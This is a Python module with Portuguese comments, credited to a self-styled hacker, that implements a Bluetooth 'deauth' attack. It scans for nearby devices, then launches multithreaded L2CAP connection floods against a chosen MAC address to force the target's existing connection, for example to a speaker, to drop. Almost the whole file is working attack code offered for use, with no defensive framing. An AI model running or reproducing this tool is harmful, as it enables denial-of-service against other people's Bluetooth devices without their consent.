"""
bluetooth_ctrl.py — Bluetooth Deauth via L2CAP Flood (sem root)
Envia rajadas de requisições L2CAP para sobrecarregar o stack BT do alvo,
forçando a queda da conexão com o dispositivo original (ex: caixa de som).
Author: Mr. Psycho | @the_psycho_of_hackers
"""

import threading
import time
import subprocess
import socket

# ── Plataforma ────────────────────────────────────────────────────────────────
try:
    from kivy.utils import platform
    _IS_ANDROID = (platform == "android")
except Exception:
    _IS_ANDROID = False

# ── Estado global ─────────────────────────────────────────────────────────────
_attack_running = threading.Event()
_attack_results = {"status": "idle", "target": "", "packets": 0, "msg": ""}

# ══════════════════════════════════════════════════════════════════════════════
#  SCAN — descobre dispositivos BT próximos
# ══════════════════════════════════════════════════════════════════════════════

def bt_scan(timeout: int = 8) -> list:
    """
    Escaneia dispositivos Bluetooth próximos.
    Retorna lista de dicts: {name, address, class}
    """
    devices = []

    # Android via pyjnius
    if _IS_ANDROID:
        devices = _android_scan(timeout)
    else:
        # Linux/desktop — usa hcitool ou socket BT
        devices = _linux_scan(timeout)

    return devices


def _android_scan(timeout: int) -> list:
    try:
        from jnius import autoclass
        BluetoothAdapter = autoclass("android.bluetooth.BluetoothAdapter")
        adapter = BluetoothAdapter.getDefaultAdapter()
        if not adapter or not adapter.isEnabled():
            return []

        devices = []

        # Dispositivos já pareados
        paired = adapter.getBondedDevices()
        it = paired.iterator()
        while it.hasNext():
            d = it.next()
            devices.append({
                "name":    d.getName() or "?",
                "address": d.getAddress(),
                "class":   "Pareado",
                "paired":  True,
            })

        # Scan de novos dispositivos (requer BLUETOOTH_SCAN permission no Android 12+)
        try:
            adapter.startDiscovery()
            time.sleep(timeout)
            adapter.cancelDiscovery()
        except Exception:
            pass

        return devices
    except Exception as e:
        return [{"name": "Erro", "address": "", "class": str(e), "paired": False}]


def _linux_scan(timeout: int) -> list:
    try:
        result = subprocess.run(
            ["hcitool", "scan", "--flush"],
            capture_output=True, text=True, timeout=timeout + 2
        )
        devices = []
        for line in result.stdout.splitlines():
            parts = line.strip().split("\t")
            if len(parts) >= 2:
                addr = parts[0].strip()
                name = parts[1].strip() if len(parts) > 1 else "?"
                if ":" in addr:
                    devices.append({"name": name, "address": addr,
                                    "class": "BT Clássico", "paired": False})
        return devices
    except Exception:
        return []

# ══════════════════════════════════════════════════════════════════════════════
#  DEAUTH — L2CAP Connection Flood (sem root)
# ══════════════════════════════════════════════════════════════════════════════

def bt_deauth_start(target_mac: str, duration: int = 30, threads: int = 6) -> dict:
    """
    Inicia ataque de flood L2CAP contra target_mac.
    Lança threads paralelas que mandam requisições de conexão em loop.
    duration = segundos que o ataque dura (padrão 30s)
    threads  = número de threads paralelas (mais = mais intenso)
    """
    global _attack_results

    if _attack_running.is_set():
        return {"ok": False, "msg": "Ataque já em andamento"}

    if not target_mac or ":" not in target_mac:
        return {"ok": False, "msg": "MAC inválido. Ex: AA:BB:CC:DD:EE:FF"}

    _attack_running.set()
    _attack_results = {
        "status":  "running",
        "target":  target_mac,
        "packets": 0,
        "msg":     f"Atacando {target_mac}...",
    }

    def _flood_worker():
        """Thread que manda L2CAP requests em loop."""
        global _attack_results
        end_time = time.time() + duration

        while _attack_running.is_set() and time.time() < end_time:
            try:
                # Tenta abrir socket L2CAP (PSM 1 = SDP, 3 = RFCOMM, 25 = HID)
                for psm in [1, 3, 7, 25]:
                    if not _attack_running.is_set():
                        break
                    try:
                        s = socket.socket(
                            socket.AF_BLUETOOTH,
                            socket.SOCK_SEQPACKET,
                            socket.BTPROTO_L2CAP
                        )
                        s.settimeout(0.3)
                        s.connect((target_mac, psm))
                        s.close()
                    except Exception:
                        try:
                            s.close()
                        except Exception:
                            pass
                    _attack_results["packets"] += 1
            except Exception:
                pass
            time.sleep(0.01)

    # Lança N threads paralelas
    for _ in range(threads):
        t = threading.Thread(target=_flood_worker, daemon=True)
        t.start()

    # Thread de controle — para após duration segundos
    def _stopper():
        time.sleep(duration)
        bt_deauth_stop()

    threading.Thread(target=_stopper, daemon=True).start()

    return {
        "ok":      True,
        "msg":     f"Flood iniciado → {target_mac} ({threads} threads, {duration}s)",
        "target":  target_mac,
        "threads": threads,
        "duration": duration,
    }


def bt_deauth_stop() -> dict:
    """Para o ataque em andamento."""
    global _attack_results
    _attack_running.clear()
    pkts = _attack_results.get("packets", 0)
    _attack_results["status"] = "stopped"
    _attack_results["msg"]    = f"Ataque parado. {pkts} pacotes enviados."
    return {"ok": True, "msg": _attack_results["msg"], "packets": pkts}


def bt_deauth_status() -> dict:
    """Retorna estado atual do ataque."""
    return dict(_attack_results)

# ══════════════════════════════════════════════════════════════════════════════
#  STATUS — Bluetooth ligado/desligado
# ══════════════════════════════════════════════════════════════════════════════

def bt_status() -> dict:
    """Retorna se BT está ativo e quantos dispositivos estão pareados."""
    if _IS_ANDROID:
        try:
            from jnius import autoclass
            BluetoothAdapter = autoclass("android.bluetooth.BluetoothAdapter")
            adapter = BluetoothAdapter.getDefaultAdapter()
            if not adapter:
                return {"enabled": False, "paired": 0, "error": "BT não disponível"}
            enabled = adapter.isEnabled()
            paired  = 0
            if enabled:
                paired = adapter.getBondedDevices().size()
            return {"enabled": enabled, "paired": paired}
        except Exception as e:
            return {"enabled": False, "paired": 0, "error": str(e)}
    else:
        try:
            r = subprocess.run(["hciconfig", "hci0"], capture_output=True, text=True)
            enabled = "UP RUNNING" in r.stdout
            return {"enabled": enabled, "paired": 0}
        except Exception:
            return {"enabled": False, "paired": 0, "error": "hciconfig não encontrado"}
